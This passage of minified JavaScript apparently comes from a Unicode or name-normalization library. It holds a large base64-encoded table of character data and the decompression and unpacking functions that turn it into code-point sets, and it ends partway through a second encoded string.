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";const hA=new Map([[8217,"apostrophe"],[8260,"fraction slash"],[12539,"middle dot"]]),dA=4;function cG(t){let e=0;function r(){return t[e++]<<8|t[e++]}let n=r(),i=1,s=[0,1];for(let S=1;S<n;S++)s.push(i+=r());let o=r(),a=e;e+=o;let c=0,u=0;function l(){return c==0&&(u=u<<8|t[e++],c=8),u>>--c&1}const h=31,d=2**h,g=d>>>1,y=g>>1,m=d-1;let b=0;for(let S=0;S<h;S++)b=b<<1|l();let A=[],_=0,T=d;for(;;){let S=Math.floor(((b-_+1)*i-1)/T),C=0,O=n;for(;O-C>1;){let F=C+O>>>1;S<s[F]?O=F:C=F}if(C==0)break;A.push(C);let $=_+Math.floor(T*s[C]/i),D=_+Math.floor(T*s[C+1]/i)-1;for(;(($^D)&g)==0;)b=b<<1&m|l(),$=$<<1&m,D=D<<1&m|1;for(;$&~D&y;)b=b&g|b<<1&m>>>1|l(),$=$<<1^g,D=(D^g)<<1|g|1;_=$,T=1+D-$}let P=n-4;return A.map(S=>{switch(S-P){case 3:return P+65792+(t[a++]<<16|t[a++]<<8|t[a++]);case 2:return P+256+(t[a++]<<8|t[a++]);case 1:return P+t[a++];default:return S-1}})}function uG(t){let e=0;return()=>t[e++]}function G2(t){return uG(cG(lG(t)))}function lG(t){let e=[];[..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"].forEach((i,s)=>e[i.charCodeAt(0)]=s);let r=t.length,n=new Uint8Array(6*r>>3);for(let i=0,s=0,o=0,a=0;i<r;i++)a=a<<6|e[t.charCodeAt(i)],o+=6,o>=8&&(n[s++]=a>>(o-=8));return n}function hG(t){return t&1?~t>>1:t>>1}function dG(t,e){let r=Array(t);for(let n=0,i=0;n<t;n++)r[n]=i+=hG(e());return r}function Dl(t,e=0){let r=[];for(;;){let n=t(),i=t();if(!i)break;e+=n;for(let s=0;s<i;s++)r.push(e+s);e+=i+1}return r}function V2(t){return Ml(()=>{let e=Dl(t);if(e.length)return e})}function K2(t){let e=[];for(;;){let r=t();if(r==0)break;e.push(fG(r,t))}for(;;){let r=t()-1;if(r<0)break;e.push(pG(r,t))}return e.flat()}function Ml(t){let e=[];for(;;){let r=t(e.length);if(!r)break;e.push(r)}return e}function Q2(t,e,r){let n=Array(t).fill().map(()=>[]);for(let i=0;i<e;i++)dG(t,r).forEach((s,o)=>n[o].push(s));return n}function fG(t,e){let r=1+e(),n=e(),i=Ml(e);return Q2(i.length,1+t,e).flatMap((o,a)=>{let[c,...u]=o;return Array(i[a]).fill().map((l,h)=>{let d=h*n;return[c+h*r,u.map(g=>g+d)]})})}function pG(t,e){let r=1+e();return Q2(r,1+t,e).map(i=>[i[0],i.slice(1)])}function gG(t){let e=[],r=Dl(t);return i(n([]),[]),e;function n(s){let o=t(),a=Ml(()=>{let c=Dl(t).map(u=>r[u]);if(c.length)return n(c)});return{S:o,B:a,Q:s}}function i({S:s,B:o},a,c){if(!(s&4&&c===a[a.length-1])){s&2&&(c=a[a.length-1]),s&1&&e.push(a);for(let u of o)for(let l of u.Q)i(u,[...a,l],c)}}}function mG(t){return t.toString(16).toUpperCase().padStart(2,"0")}function Y2(t){return`{${mG(t)}}`}function yG(t){let e=[];for(let r=0,n=t.length;r<n;){let i=t.codePointAt(r);r+=i<65536?1:2,e.push(i)}return e}function Tc(t){let r=t.length;if(r<4096)return String.fromCodePoint(...t);let n=[];for(let i=0;i<r;)n.push(String.fromCodePoint(...t.slice(i,i+=4096)));return n.join("")}function wG(t,e){let r=t.length,n=r-e.length;for(let i=0;n==0&&i<r;i++)n=t[i]-e[i];return n}var bG="AEUDVgHLCGMATwDUADIAdAAhADQAFAAtABQAIQAPACcADQASAAoAGAAJABIACQARAAUACwAFAAwABQAQAAMABwAEAAoABQAJAAIACgABAAQAFAALAAIACwABAAIAAQAHAAMAAwAEAAsADAAMAAwACwANAA0AAwAKAAkABAAdAAYAZwDTAeYDMwCxCl8B8xhZAqfoC190UGcThgBurwf7PT09Pb09AjgJum8OjDllxHYUKXAPxzq6tABAxgK8ysUvWAgMPT09PT09PSs6LT2HcgWXWwFLoSMEEEl5RFVMKvO0XQ8ExDdJMnIgPi89uj00MsvBXxEPAGPCDwBnQKoEbwRwBHEEcgRzBHQEdQR2BHcEeAR6BHsEfAR+BIAEgfndBQoBYgULAWIFDAFiBNcE2ATZBRAFEQUvBdALFAsVDPcNBw13DYcOMA4xDjMB4BllHI0B2grbAMDpHLkQ7QHVAPRNQQFnGRUEg0yEB2uaJF8AJpIBpob5AERSMAKNoAXqaQLUBMCzEiC+AZ4EWRJJFbEu7QDQLARtEbgECxDwAb/RyAk1AV4nD2cEQQKTAzsAGpobWgAahAGPCrysdy0OAKwAfFIcBAQFUmoA/PtZADkBIadVj2UMUgx5Il4ANQC9vAITAdQZWxDzALN9AhsZVwIcGSkCBAgXOhG7AqMZ4M7+1M0UAPDNAW